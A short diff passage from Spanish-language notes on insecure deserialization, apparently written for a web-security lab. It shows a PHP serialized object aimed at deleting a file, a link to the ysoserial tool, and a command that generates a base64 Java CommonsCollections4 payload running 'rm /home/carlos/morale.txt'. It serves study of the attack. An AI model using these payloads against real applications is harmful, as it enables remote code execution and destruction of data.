@@ -32,7 +32,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 
 5. Apache Commons:
 	1. Las cookies de Java comienzan por **'rOO...'**
-	2. Descargamos el YSOSERIAL.jar
+	2. Descargamos el YSOSERIAL.jar : https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
 	3. Probamos payloads con los distintos CommonsCollections{1,2,3,4}
 ```bash
 java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0;
